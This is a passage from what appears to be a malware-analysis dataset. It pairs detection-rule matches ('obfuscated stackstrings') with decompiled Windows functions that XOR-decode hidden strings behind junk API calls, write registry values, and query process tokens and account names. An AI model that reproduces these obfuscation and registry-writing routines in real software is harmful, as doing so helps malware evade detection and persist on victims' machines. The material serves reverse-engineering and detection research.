        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407172(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    int16_t *var_b0h;\n    int32_t var_ach;\n    int16_t *var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t hKey;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_b8h = 1;\n    var_2ch = 0x39504e76;\n    var_28h = 0x4e533832;\n    var_24h = 0x38383940;\n    var_20h = 0x397c4e46;\n    var_1ch = 0x4e41383a;\n    var_18h = 0x38353941;\n    var_14h = 0x39594e5e;\n    var_10h._0_2_ = 0x3854;\n    var_8h = 0x39354e32;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0x38;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_a4h = 6;\n    var_b4h = 0;\n    iVar10 = 0;\n    var_a8h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar5 != 0x79bb23) {\n            *(iVar10 + piVar4) = *(&var_8h + iVar10 % var_a4h) ^ (iVar10 + piVar4)[&var_2ch - piVar4];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x1e);\n    var_a0h = 0x66167a2b;\n    var_9ch = 0x7a0c385f;\n    var_98h = 0x3858660e;\n    var_94h = 0x661c7a0a;\n    var_90h = 0x7a353865;\n    var_8ch = 0x385a6610;\n    var_88h = 0x66167a0a;\n    var_84h = 0x7a17384a;\n    var_80h = 0x384d661f;\n    var_7ch = 0x66307a24;\n    var_78h = 0x7a39387c;\n    var_74h = 0x38656632;\n    var_70h = 0x660b7a3f;\n    var_6ch = 0x7a0d3856;\n    var_68h = 0x38696609;\n    var_64h = 0x66157a17;\n    var_60h = 0x7a1b3850;\n    var_5ch = 0x38656600;\n    var_58h = 0x661c7a28;\n    var_54h = 0x7a1c3857;\n    var_50h = 0x38576610;\n    var_4ch = 0x663e7a1f;\n    var_48h = 0x7a373869;\n    var_44h = 0x3839660a;\n    var_8h = 0x66797a78;\n    var_4h._0_1_ = 0x39;\n    var_4h._1_1_ = 0x38;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_38h = &var_a0h - iVar10;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0xae3e0e) {\n            *(iVar5 + iVar10) = *(&var_8h + iVar5 % var_a4h) ^ (iVar5 + iVar10)[&var_a0h - iVar10];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    hKey = fcn.00407b3b(0x20006);\n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    piVar4 = var_a8h;\n    if (hKey != 0) {\n        var_ch = 0x500e340d;\n        var_ach = 5;\n        var_8h = 0x615a4e05;\n        var_4h._0_1_ = 0x24;\n        var_4h._1_1_ = 0x70;\n        var_4h._2_1_ = 0x4e;\n        var_4h._3_1_ = 0x34;\n        var_34h = 0x5061344e;\n        var_30h._0_1_ = 0x70;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        var_40h = &var_ch - iVar5;\n        var_38h = iVar5;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            if (iVar7 != 0x4e7075) {\n                *(iVar6 + iVar5) = *(&var_34h + iVar6 % var_ach) ^ (iVar6 + iVar5)[&var_ch - iVar5];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xc);\n        var_1ch = 0x6458703e;\n        var_18h = 0x39186e07;\n        var_14h = 0x706e7355;\n        var_8h = 0x6439706e;\n        var_4h._0_1_ = 0x73;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        var_34h = &var_1ch - iVar5;\n        var_40h = iVar5;\n        do {\n            iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n            if (iVar7 != 0x230924) {\n                *(iVar6 + iVar5) = *(&var_8h + iVar6 % var_ach) ^ (iVar6 + iVar5)[var_34h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xc);\n        var_20h = 0x78346c36;\n        var_1ch = 0x6c11662f;\n        var_18h = 0x66237838;\n        var_14h = 0x78606c0b;\n        var_10h._0_2_ = 0x664c;\n        var_8h = 0x78516c65;\n        var_4h._0_1_ = 0x4c;\n        var_4h._1_1_ = 0x66;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        var_34h = &var_20h - iVar5;\n        do {\n            iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n            if (iVar7 != 0x69d434) {\n                *(iVar6 + iVar5) = *(&var_8h + iVar6 % var_a4h) ^ (iVar6 + iVar5)[&var_20h - iVar5];\n            }\n            pcVar9 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_38h, 0, 4, &var_b8h, 4);\n        piVar4 = var_a8h;\n        piVar8 = var_b0h;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != var_b4h);\n        (*pcVar9)(hKey, var_40h, 0, 1, var_b0h, (piVar8 - (var_b0h + 1) >> 1) * 2);\n        piVar8 = piVar4;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != var_b4h);\n        (*pcVar9)(hKey, iVar5, 0, 1, piVar4, (piVar8 - (piVar4 + 1) >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar9)(0, var_40h);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar9)(0, var_38h);\n        (*pcVar2)(uVar3);\n    }\n    uVar3 = (*pcVar9)(0, iVar10);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar9)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 2701
    },
    "004076f7": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004076f7(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    int32_t iVar7;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar uStack52;\n    uint var_2fh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uchar *pszFirst;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0;\n    pszFirst = puVar4;\n    fcn.00405ecf();\n    if (puVar4 == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_7ch = 0x4b366b55;\n        var_78h = 0x773b7032;\n        var_74h = 0x6b31620f;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_70h = 0x70234b23;\n        var_6ch = 0x6217774e;\n        var_68h = 0x4b1e6b3d;\n        var_64h = 0x77197001;\n        var_60h = 0x6b036224;\n        var_5ch = 0x70044b18;\n        var_58h = 0x6217771f;\n        var_54h = 0x4b196b39;\n        var_50h = 0x770e7016;\n        var_4ch = 0x6b1e6239;\n        var_48h = 0x70164b12;\n        var_44h = 0x620e774b;\n        var_40h = 0x4b076b08;\n        var_3ch = 0x7704700e;\n        var_38h = 0x6b156239;\n        var_4h = 5;\n        var_34h = 0x703e4b05;\n        uStack52 = 0x6b;\n        var_2fh._0_1_ = 0x77;\n        var_1ch = 0x4b776b70;\n        var_18h._0_1_ = 0x62;\n        uVar3 = (*pcVar1)(8, 0x9d);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = iVar6;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar5 != 0xe058da) {\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_7ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n        var_4ch = 0x493d3829;\n        var_48h = 0x444c5a14;\n        var_44h = 0x3837672c;\n        var_40h = 0x5a154934;\n        var_3ch = 0x672f4457;\n        var_38h = 0x49283833;\n        var_34h = 0x44385a02;\n        stack0xffffffd0 = 0x4944385a;\n        var_28h._0_1_ = 0x67;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_1ch = iVar6;\n        var_14h = &var_4ch - iVar6;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n            puVar4 = pszFirst;\n            if (iVar5 != 0x30ab43) {\n                *(iVar7 + iVar6) = *(&var_2fh + iVar7 % var_4h + 3) ^ (iVar7 + iVar6)[&var_4ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1c);\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar6);\n        if (iVar7 != 0) {\n            var_58h = 0x50653944;\n            var_54h = 0x364a611b;\n            var_50h = 0x39046224;\n            var_4ch = 0x6130505b;\n            var_48h = 0x623f3656;\n            var_44h = 0x50133915;\n            var_40h = 0x366d613e;\n            var_3ch = 0x39126231;\n            var_38h = 0x6111505d;\n            var_34h = 0x62503665;\n            stack0xffffffd0 = 0x50363961;\n            var_28h._0_1_ = 0x62;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_14h = &var_58h - iVar6;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n                puVar4 = pszFirst;\n                if (iVar5 != 0x67fe74) {\n                    *(iVar7 + iVar6) = *(&var_2fh + iVar7 % var_4h + 3) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar6 = var_1ch;\n        }\n        iVar7 = var_ch;\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar4, *0x41cabc);\n        uVar3 = extraout_ECX;\n        iVar5 = fcn.0040fa39(var_20h);\n        if (iVar5 == 0) {\n            fcn.0040e180(uVar3);\n            fcn.0040f5e9();\n            var_10h = fcn.004075b0();\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar7);\n        (*pcVar1)(uVar3);\n    }\n    return var_10h;\n}\n",
        "token_count": 2006
    },
    "0040836f": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040836f(uint *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *dwProcessId;\n    uint pSessionId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    dwProcessId = param_1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar5 != 0) {\n                                    var_60h = 0x4970493b;\n                                    var_5ch = 0x351a6839;\n                                    var_58h = 0x49276a00;\n                                    var_54h = 0x6850497b;\n                                    var_50h = 0x6a153515;\n                                    var_4ch = 0x4946494d;\n                                    var_48h = 0x356c6836;\n                                    var_44h = 0x49346a3a;\n                                    var_40h = 0x680e4910;\n                                    var_3ch._0_2_ = 0x3549;\n                                    var_38h = 0x49354968;\n                                    var_34h._0_1_ = 0x6a;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                                        if (iVar4 != 0xb48d00) {\n                                            var_1ch = 5;\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_38h + iVar8 % 5) ^ (iVar8 + iVar5)[&var_60h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1511
    },
    "00408959": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00408959(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    int32_t iVar26;\n    int32_t iVar27;\n    int32_t iVar28;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint8_t *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint8_t var_18h [2];\n    uint var_16h;\n    uint var_12h;\n    uint var_eh;\n    uint var_ah;\n    uint var_4h;\n    \n    var_20h._0_1_ = 0x17;\n    var_20h._1_1_ = 0x2e;\n    var_20h._2_1_ = 0x16;\n    var_20h._3_1_ = 0xb;\n    var_1ch._0_1_ = 0x28;\n    var_38h = 5;\n    var_1ch._1_1_ = 5;\n    var_1ch._2_1_ = 0x30;\n    var_1ch._3_1_ = 0x2e;\n    var_18h[0] = 1;\n    var_18h[1] = 0x16;\n    var_16h._0_1_ = 0x26;\n    var_16h._1_1_ = 1;\n    var_16h._2_1_ = 0x2a;\n    var_16h._3_1_ = 0x1b;\n    var_12h._0_1_ = 0x27;\n    var_12h._1_1_ = 0x10;\n    var_12h._2_1_ = 0x3b;\n    var_12h._3_1_ = 0xd;\n    var_eh._0_1_ = 0x28;\n    var_eh._1_1_ = 0x2e;\n    var_eh._2_1_ = 0x32;\n    var_eh._3_1_ = 0x1c;\n    var_ah._0_1_ = 0x4d;\n    stack0xfffffff4 = 0x79554b44;\n    var_4h._0_2_ = 0x644d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 6;\n    iVar28 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar5 != 0x599d92) {\n            *(iVar28 + iVar4) = *(&var_ah + iVar28 % var_34h + 2) ^ (iVar28 + iVar4)[&var_20h - iVar4];\n        }\n        iVar28 = iVar28 + 1;\n    } while (iVar28 < 0x17);\n    fcn.00406483();\n    var_1ch._3_1_ = 5;\n    var_28h = 0x2222086a;\n    var_24h._0_1_ = 0x40;\n    var_24h._1_1_ = 0;\n    var_24h._2_1_ = 0x5e;\n    var_24h._3_1_ = 3;\n    var_20h._0_1_ = 0x33;\n    var_20h._1_1_ = 0x23;\n    var_20h._2_1_ = 0x5a;\n    var_20h._3_1_ = 4;\n    var_1ch._0_1_ = 0x58;\n    var_1ch._1_1_ = 0x1f;\n    var_1ch._2_1_ = 0x1a;\n    var_18h[0] = 0x5c;\n    var_18h[1] = 2;\n    var_16h._0_1_ = 0x5c;\n    var_16h._1_1_ = 3;\n    var_16h._2_1_ = 0x33;\n    var_16h._3_1_ = 0x23;\n    var_12h._0_1_ = 0x5a;\n    var_12h._1_1_ = 0x1f;\n    var_12h._2_1_ = 0x50;\n    var_12h._3_1_ = 1;\n    var_eh._0_1_ = 6;\n    var_eh._1_1_ = 0x36;\n    var_eh._2_1_ = 0x56;\n    var_eh._3_1_ = 0x69;\n    stack0xfffffff4 = 0x51636d39;\n    var_4h._0_2_ = 0x6933;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar28 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_2ch = &var_28h - iVar28;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x9b6ad4) {\n            *(iVar5 + iVar28) = *(&var_ah + iVar5 % var_34h + 2) ^ (iVar5 + iVar28)[&var_28h - iVar28];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.00406483();\n    var_20h._0_1_ = 0x6a;\n    var_20h._1_1_ = 0x20;\n    var_20h._2_1_ = 0x7a;\n    var_20h._3_1_ = 0x2a;\n    var_1ch._0_1_ = 0x24;\n    var_1ch._1_1_ = 0x52;\n    var_1ch._2_1_ = 8;\n    var_1ch._3_1_ = 0x53;\n    var_18h[0] = 0x28;\n    var_18h[1] = 0x28;\n    var_16h._0_1_ = 0x4b;\n    var_16h._1_1_ = 0x3c;\n    var_16h._2_1_ = 0x66;\n    var_16h._3_1_ = 0x37;\n    var_12h._0_1_ = 0x2e;\n    var_12h._1_1_ = 0x4f;\n    var_12h._2_1_ = 0x2c;\n    var_12h._3_1_ = 0x5a;\n    var_eh._0_1_ = 0x20;\n    var_eh._1_1_ = 0x20;\n    var_eh._2_1_ = 0x5c;\n    var_eh._3_1_ = 0x45;\n    var_68h = 0x45364539;\n    var_64h._0_1_ = 0x47;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_2ch = &var_20h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar7 != 0xe7699e) {\n            *(iVar6 + iVar5) = *(&var_68h + iVar6 % var_38h) ^ (iVar6 + iVar5)[&var_20h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x16);\n    fcn.00406483();\n    var_24h._3_1_ = 6;\n    var_24h._0_1_ = 0x29;\n    var_24h._1_1_ = 1;\n    var_24h._2_1_ = 0x1c;\n    var_20h._0_1_ = 5;\n    var_20h._1_1_ = 0x26;\n    var_20h._2_1_ = 0x1f;\n    var_1ch._0_1_ = 0x26;\n    var_1ch._1_1_ = 0xd;\n    var_1ch._2_1_ = 0x37;\n    var_1ch._3_1_ = 0x21;\n    var_18h[0] = 0x15;\n    var_18h[1] = 0x10;\n    var_16h._0_1_ = 0x34;\n    var_16h._1_1_ = 0x38;\n    var_16h._2_1_ = 0x14;\n    var_16h._3_1_ = 0x3d;\n    var_12h._0_1_ = 0xc;\n    var_12h._1_1_ = 0xd;\n    var_12h._2_1_ = 0x39;\n    var_12h._3_1_ = 0xd;\n    var_eh._0_1_ = 1;\n    var_eh._1_1_ = 0x31;\n    var_eh._2_1_ = 0x7a;\n    stack0xfffffff4 = 0x6855647a;\n    var_4h._0_2_ = 0x5466;\n    var_20h._3_1_ = var_20h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_68h = iVar6;\n    var_2ch = &var_24h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar8 != 0x154196) {\n            *(iVar7 + iVar6) = *(&var_ah + iVar7 % var_34h + 2) ^ (iVar7 + iVar6)[&var_24h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x19);\n    fcn.00406483();\n    var_24h._0_1_ = 0x6b;\n    var_24h._1_1_ = 0xe;\n    var_24h._2_1_ = 0x66;\n    var_24h._3_1_ = 0x26;\n    var_20h._0_1_ = 0x24;\n    var_20h._1_1_ = 0xe;\n    var_20h._2_1_ = 0x54;\n    var_20h._3_1_ = 2;\n    var_1ch._0_1_ = 0x50;\n    var_1ch._1_1_ = 0x21;\n    var_1ch._2_1_ = 0x23;\n    var_1ch._3_1_ = 4;\n    var_18h[0] = 0x5c;\n    var_18h[1] = 0x22;\n    var_16h._0_1_ = 0x5d;\n    var_16h._1_1_ = 0x38;\n    var_16h._2_1_ = 0x22;\n    var_16h._3_1_ = 0x15;\n    var_12h._0_1_ = 0x68;\n    var_12h._1_1_ = 0x19;\n    var_12h._2_1_ = 0x5a;\n    var_12h._3_1_ = 0x3e;\n    var_eh._0_1_ = 0x3e;\n    var_eh._1_1_ = 0xd;\n    var_eh._2_1_ = 0x5d;\n    var_eh._3_1_ = 0xc;\n    var_ah._0_1_ = 0x56;\n    var_ah._1_1_ = 0x48;\n    stack0xfffffff4 = 0x48336b38;\n    var_4h._0_2_ = 0x6157;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_2ch = &var_24h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar8 != 0x617eae) {\n            *(iVar7 + iVar6) = *(&var_ah + iVar7 % var_34h + 2) ^ (iVar7 + iVar6)[&var_24h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    